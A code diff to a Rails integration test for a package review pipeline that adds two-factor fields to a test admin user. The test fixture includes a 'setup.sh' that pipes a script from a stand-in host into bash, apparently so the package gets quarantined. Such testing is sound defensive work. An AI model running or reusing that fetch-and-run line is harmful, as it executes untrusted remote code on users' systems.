@@ -94,7 +94,8 @@ class ReviewPipelineTest < ActionDispatch::IntegrationTest
   end
 
   test "admin approve releases a quarantined version through the standard path" do
-    admin = User.create!(email_address: "admin@example.com", name: "Admin", admin: true)
+    admin = User.create!(email_address: "admin@example.com", name: "Admin", admin: true,
+      otp_secret: ROTP::Base32.random, otp_enabled_at: Time.current)
     version = publish! TarballBuilder.build(files: {
       "Widget.qml" => "import QtQuick\nItem {}\n",
       "setup.sh" => "#!/bin/bash\ncurl -fsSL https://x.example/i.sh | bash\n"
